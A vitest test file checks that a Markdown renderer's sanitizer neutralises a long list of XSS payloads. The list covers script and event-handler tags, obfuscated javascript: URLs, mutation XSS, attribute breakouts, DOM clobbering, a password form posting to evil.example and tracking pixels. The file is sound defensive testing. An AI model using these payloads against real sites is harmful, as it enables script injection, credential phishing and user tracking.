// Spec §11: saved content is untrusted. Every payload here must come out inert, with or without inline HTML enabled.

import { describe, expect, test } from 'vitest';
import { expectSafe, parse, renderer } from './helpers.ts';

const withHtml = renderer();
const withoutHtml = renderer({ html: false });
const html = (md: string) => withHtml.render(md, { remoteImages: true }).html;

const PAYLOADS: Array<[string, string]> = [
  // Scripts and event handlers
  ['<script>', '<script>alert(1)</script>'],
  ['<script> mid-paragraph', 'Hello <script>alert(1)</script> world'],
  ['<img onerror>', '<img src=x onerror=alert(1)>'],
  ['<img onerror> in Markdown paragraph', 'text <img src="https://a.example/i.png" onerror="alert(1)"> text'],
  ['<svg onload>', '<svg onload=alert(1)>'],
  ['<svg><script>', '<svg><script>alert(1)</script></svg>'],
  ['<body onload>', '<body onload=alert(1)>'],
  ['<details ontoggle>', '<details open ontoggle=alert(1)><summary>x</summary></details>'],
  ['<p onmouseover>', '<p onmouseover="alert(1)">hover</p>'],
  ['<a onclick>', '<a href="https://a.example" onclick="alert(1)">x</a>'],
  ['<input onfocus autofocus>', '<input type="checkbox" onfocus=alert(1) autofocus>'],
  // Embedding
  ['<iframe src>', '<iframe src="https://evil.example"></iframe>'],
  ['<iframe srcdoc>', '<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
  ['<object>', '<object data="https://evil.example/x.swf"></object>'],
  ['<embed>', '<embed src="https://evil.example/x.swf">'],
  ['<frameset>', '<frameset><frame src="javascript:alert(1)"></frameset>'],
  ['<template>', '<template><script>alert(1)</script></template>'],
  ['<noscript>', '<noscript><img src=x onerror=alert(1)></noscript>'],
  ['<xmp>', '<xmp><img src=x onerror=alert(1)></xmp>'],
  // Script URLs: raw HTML
  ['javascript: href', '<a href="javascript:alert(1)">x</a>'],
  ['mixed-case javascript:', '<a href="jAvAsCrIpT:alert(1)">x</a>'],
  ['javascript&colon;', '<a href="javascript&colon;alert(1)">x</a>'],
  [
    'decimal entity javascript:',
    '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>',
  ],
  ['hex entity javascript:', '<a href="&#x6A;avascript&#x3A;alert(1)">x</a>'],
  ['tab inside javascript:', '<a href="java&#x09;script:alert(1)">x</a>'],
  ['newline inside javascript:', '<a href="java&#10;script:alert(1)">x</a>'],
  ['leading space javascript:', '<a href=" javascript:alert(1)">x</a>'],
  ['leading control char javascript:', '<a href="&#x01;javascript:alert(1)">x</a>'],
  ['vbscript:', '<a href="vbscript:msgbox(1)">x</a>'],
  ['data:text/html href', '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>'],
  ['data:image href', '<a href="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">x</a>'],
  ['javascript: img src', '<img src="javascript:alert(1)">'],
  ['data:text/html img src', '<img src="data:text/html,<script>alert(1)</script>">'],
  ['file: href', '<a href="file:///etc/passwd">x</a>'],
  ['blob: href', '<a href="blob:https://a.example/uuid">x</a>'],
  ['formaction', '<button formaction="javascript:alert(1)">x</button>'],
  ['xlink:href', '<a xlink:href="javascript:alert(1)">x</a>'],
  // Script URLs: Markdown syntax
  ['[x](javascript:)', '[x](javascript:alert(1))'],
  ['[x](JaVaScRiPt:)', '[x](JaVaScRiPt:alert(1))'],
  ['[x](javascript&colon;)', '[x](javascript&colon;alert(1))'],
  ['[x](&#x6A;avascript:)', '[x](&#x6A;avascript:alert(1))'],
  ['[x](<javascript:…>)', '[x](<javascript:alert(1)>)'],
  ['<javascript:…> autolink', '<javascript:alert(1)>'],
  ['[x](vbscript:)', '[x](vbscript:msgbox(1))'],
  ['[x](data:text/html)', '[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)'],
  ['reference link to javascript:', '[x][r]\n\n[r]: javascript:alert(1)'],
  ['![x](javascript:)', '![x](javascript:alert(1))'],
  // Styles and forms
  ['<style>', '<style>body{display:none}</style>'],
  ['<style> with @import', '<style>@import "https://evil.example/x.css";</style>'],
  ['style attribute', '<p style="background:url(https://track.example/p.gif)">x</p>'],
  ['<link rel=stylesheet>', '<link rel="stylesheet" href="https://evil.example/x.css">'],
  ['<form>', '<form action="https://evil.example"><input name="password" type="password"><button>Go</button></form>'],
  ['<input type=text>', '<input type="text" value="phish">'],
  ['<textarea>, <select>', '<textarea>x</textarea><select><option>1</option></select>'],
  ['<meta refresh>', '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'],
  ['<base href>', '<base href="https://evil.example/">'],
  // MathML and SVG mutation XSS (namespace confusion)
  ['<math><mtext><table><mglyph><style>', '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>'],
  [
    '<math><mi><mglyph><svg><mtext><style>',
    '<math><mi><mglyph><svg><mtext><style><img src=x onerror=alert(1)></style>',
  ],
  ['<svg></p><style>', '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">'],
  ['<form><math><mtext></form>', '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>'],
  ['<noscript><p title=…>', '<noscript><p title="</noscript><img src=x onerror=alert(1)>">'],
  ['<math href>', '<math href="javascript:alert(1)">x</math>'],
  ['<svg><a xlink:href>', '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>'],
  ['<svg><animate>', '<svg><animate onbegin=alert(1) attributeName=x dur=1s>'],
  ['comment breakout', '<!--<img src="--><img src=x onerror=alert(1)//">'],
  ['CDATA', '<![CDATA[<img src=x onerror=alert(1)>]]>'],
  ['<title> breakout', '<title><img src="</title><img src=x onerror=alert(1)>">'],
  // Attribute breakouts through Markdown syntax
  ['link destination with quotes', '[x](https://a.example/" onmouseover="alert(1))'],
  ['link title with quotes', '[x](https://a.example "t\\" onmouseover=\\"alert(1)")'],
  ['image alt with quotes', '![a" onerror="alert(1)](https://a.example/i.png)'],
  ['image title with quotes', '![a](https://a.example/i.png "t\\" onerror=\\"alert(1)")'],
  ['code fence info string', '```js" onmouseover="alert(1)\ncode\n```'],
  ['raw attribute with quotes', `<a title='x" onclick="alert(1)' href="https://a.example">x</a>`],
  ['callout type', '> [!note" onclick="alert(1)] Title\n> body'],
  ['callout title', '> [!note] <img src=x onerror=alert(1)>\n> body'],
  ['math', '$<img src=x onerror=alert(1)>$ and $$<script>alert(1)</script>$$'],
  ['footnote label', 'x[^"><img src=x onerror=alert(1)>]\n\n[^"><img src=x onerror=alert(1)>]: note'],
  // DOM clobbering
  ['id clobbering', '<a id="cookie">x</a><img name="getElementById" src="https://a.example/i.png">'],
  ['form clobbering', '<form name="body"><input name="attributes"></form>'],
];

describe.each([
  ['inline HTML on', withHtml],
  ['inline HTML off', withoutHtml],
])('XSS payloads (%s)', (_, r) => {
  test.each(PAYLOADS)('%s is neutralized', (_, payload) => {
    const out = r.render(payload, { remoteImages: true }).html;
    expectSafe(out);
    expect(parse(out).querySelector('[onerror], [onload], [onclick], [onmouseover]')).toBeNull();
  });
});

describe('neutralized payloads keep readable text', () => {
  test('a javascript: link keeps its text without an href', () => {
    const a = parse(html('<a href="jAvAsCrIpT:alert(1)">click</a>')).querySelector('a');
    expect(a?.textContent).toBe('click');
    expect(a?.hasAttribute('href')).toBe(false);
  });

  test('a Markdown javascript: link is left as plain text', () => {
    const root = parse(html('[click](javascript:alert(1))'));
    expect(root.querySelector('a')).toBeNull();
    expect(root.textContent).toContain('[click](javascript:alert(1))');
  });

  test('a script in a code fence is shown, not run', () => {
    const root = parse(html('```html\n<script>alert(1)</script>\n```'));
    expect(root.querySelector('script')).toBeNull();
    expect(root.querySelector('code')?.textContent).toBe('<script>alert(1)</script>\n');
  });

  test('form content survives as text, without the form or its controls', () => {
    const root = parse(html('<form action="https://evil.example">Sign in <input name="p"><button>Go</button></form>'));
    expect(root.querySelector('form, input, button')).toBeNull();
    expect(root.textContent).toContain('Sign in');
  });

  test('ids are prefixed so saved content cannot clobber the host page', () => {
    const root = parse(html('<a id="cookie">x</a>'));
    expect(root.querySelector('a')?.id).toBe('user-content-cookie');
  });

  test('a raw task-list checkbox loses its handlers and stays disabled', () => {
    const input = parse(html('<input type="checkbox" checked name="x" onclick="alert(1)">')).querySelector('input');
    expect(input?.getAttributeNames().sort()).toEqual(['checked', 'disabled', 'type']);
  });
});

describe('malicious frontmatter', () => {
  const md = [
    '---',
    'title: "<script>alert(1)</script>"',
    'image: "javascript:alert(1)"',
    'description: "</p><img src=x onerror=alert(1)>"',
    '---',
    '',
    'Body.',
    '',
  ].join('\n');

  test('none of it reaches the rendered HTML', () => {
    const out = withHtml.render(md);
    expectSafe(out.html);
    expect(out.html).toBe('<p>Body.</p>\n');
  });

  test('it is returned raw, as data the caller must escape', () => {
    expect(withHtml.render(md).frontmatter).toContain('<script>alert(1)</script>');
  });

  test('an unclosed frontmatter block is rendered as sanitized Markdown', () => {
    const out = withHtml.render('---\ntitle: <img src=x onerror=alert(1)>\n\nBody');
    expect(out.frontmatter).toBeNull();
    expectSafe(out.html);
  });

  test('a fake second frontmatter block after the first is body content and sanitized', () => {
    const out = withHtml.render('---\na: 1\n---\n---\n<script>alert(1)</script>\n---\n');
    expect(out.frontmatter).toBe('a: 1');
    expectSafe(out.html);
  });
});

describe('remote-image toggle cannot be bypassed', () => {
  const blocked = (md: string) => {
    const out = withHtml.render(md, { remoteImages: false });
    expectSafe(out.html);
    return parse(out.html);
  };

  test.each([
    ['Markdown image', '![a](https://track.example/p.gif)'],
    ['raw <img>', '<img src="https://track.example/p.gif">'],
    ['uppercase scheme', '<img src="HTTPS://track.example/p.gif">'],
    ['protocol-relative', '<img src="//track.example/p.gif">'],
    ['srcset', '<img src="images/a.png" srcset="https://track.example/p.gif 1x">'],
    ['<picture><source>', '<picture><source srcset="https://track.example/p.gif"><img alt="a"></picture>'],
    ['<input type=image>', '<input type="image" src="https://track.example/p.gif">'],
    ['<video poster>', '<video poster="https://track.example/p.gif"></video>'],
    ['background attribute', '<table background="https://track.example/p.gif"><tr><td>x</td></tr></table>'],
    ['style background', '<div style="background-image:url(https://track.example/p.gif)">x</div>'],
  ])('%s', (_, md) => {
    const root = blocked(md);
    expect(root.querySelector('[srcset], [poster], [background], [style], source, video, picture')).toBeNull();
    for (const el of Array.from(root.querySelectorAll('[src]'))) {
      expect(el.getAttribute('src')).not.toMatch(/track\.example/);
    }
  });
});
